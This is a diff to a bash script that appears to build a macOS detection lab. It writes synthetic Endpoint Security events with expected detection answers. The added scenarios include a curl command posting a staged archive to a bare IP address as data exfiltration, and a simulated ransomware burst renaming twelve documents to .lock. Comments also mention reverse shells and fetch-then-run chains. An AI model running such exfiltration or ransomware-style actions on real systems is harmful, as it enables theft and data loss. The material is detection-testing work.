@@ -357,6 +357,7 @@ run() {
 #   90  a second shell: base64 -d, and a bash reading from a pipe a second later: a pasted command
 #   95  launchd starts Script Editor, which runs a shell
 #  100  zsh: curl -o writes an ad-hoc program into /tmp/lab, which runs a second later
+#  120  a team-signed app renames twelve documents in under a second, each given a .lock ending: ransomware
 synthetic_story() {
   answer_header
   local LAUNCHD TERMINAL LOGIN ZSH MONITOR NOTES TERMINAL2 ZSH2 SHELL2 bash curl agent sub sl daemon c
@@ -534,6 +535,13 @@ synthetic_story() {
   run_as 101.1 "$ZSH" 7651 9651 "$LAB/stage2" adhoc stage2-55554944f0be3f1f '' stage2 --run
   answer dropped dropped-then-executed high queued 'stage2 --run' 'A program written by curl runs a second later from the staging folder, and it is ad-hoc signed: fetch, then run.'
 
+  # 13b. The shell posts an archive from the staging folder to a server that is a bare IP address.
+  local up
+  ev_fork 102.0 "$ZSH" 7655 9655; up=$LAST
+  ev_exec 102.1 "$up" /usr/bin/curl platform com.apple.curl '' "$CWD" tty curl -X POST --data-binary "@$LAB/outbox.zip" http://203.0.113.9/log
+  ev_exit 102.6 "$up"
+  answer upload file-upload high queued 'outbox.zip http' 'curl posts an archive from the staging folder to a bare IP address: the staged loot leaves the Mac.'
+
   # 14. A program in the staging folder opens a reverse shell: sh -c wires bash -i to a TCP connection, so bash reads
   #     its commands from a socket.
   local svc sh rbash
@@ -576,6 +584,18 @@ synthetic_story() {
   ev_close 115.3 "$ow" /Library/LaunchDaemons/com.example.updater.plist true
   ev_exit 115.4 "$ow"
   answer overwrite persistence-plist high queued 'cat /tmp/lab/updater.plist' 'An existing launch daemon plist is overwritten in place: no file is created, so only a write or a modified close shows it.'
+
+  # 17. A team-signed app renames twelve documents in a row, each with a new ending added (.lock, one of the endings the clean script keeps): ransomware marking the
+  #     files it encrypted in place. Twelve renames 40 ms apart.
+  local vault n
+  ev_fork 120.0 "$ZSH" 7690 9690; vault=$LAST
+  ev_exec 120.1 "$vault" '/Applications/Lab Vault.app/Contents/MacOS/Lab Vault' team com.example.labvault LAB0CCCC03 "$CWD" tty 'Lab Vault' --lock-documents
+  for n in 1 2 3 4 5 6 7 8 9 10 11 12; do
+    sec_plus 120.2 $((n * 40))
+    ev_rename "$SEC_OUT" "$vault" "/Users/learner/Documents/report$n.docx" "/Users/learner/Documents/report$n.docx.lock"
+  done
+  ev_exit 121.0 "$vault"
+  answer encrypt mass-rename high queued '--lock-documents' 'One program renames twelve documents in under a second, each with .lock added: how ransomware marks what it has encrypted in place.'
 }
 
 # ---- live mode --------------------------------------------------------------------------------------------------
@@ -599,7 +619,9 @@ live_answers() {
     '#   keychain-access med and low: the lab makes one keychain call, for an item that does not exist.' \
     '#   credential-store-copy: the lab will not copy the real keychain or a browser'"'"'s password database.' \
     '#   apple-masquerade: the lab will not write a com.apple launch plist, and an unsigned program will not run.' \
+    '#   mass-rename: needs one process renaming many files; the lab will not rename a folder of real documents.' \
     '#   clickfix-paste-chain: the lab will not fetch with curl -k or a custom user agent, or run what it decodes.' \
+    '#   file-upload: the lab will not send a file off the Mac, not even to nowhere; a loopback server is ignored by the rule.' \
     '#   risky-parent-spawn for Script Editor, Office and developer tools: the lab opens none of them (only its applet).' \
     '#   persistence-item med on its own row: needs an app'"'"'s own launch agent.' \
     '#   reverse-shell: the lab opens no reverse shell, even to loopback, so endpoint protection is not set off.' >&4
@@ -755,7 +777,7 @@ EOF
   ES_ERR=$(mktemp /tmp/ficus-lab-eslogger.XXXXXX) || die "cannot create a temporary file"
   PLIST=$HOME/Library/LaunchAgents/$LIVE_LABEL.plist
   : > "$out"
-  sudo -n eslogger fork exec exit create rename unlink setextattr btm_launch_item_add btm_launch_item_remove > "$out" 2> "$ES_ERR" &
+  sudo -n eslogger fork exec exit create rename unlink setextattr clone copyfile btm_launch_item_add btm_launch_item_remove > "$out" 2> "$ES_ERR" &
   ES_PID=$!
   local i=0
   while [ ! -s "$out" ]; do
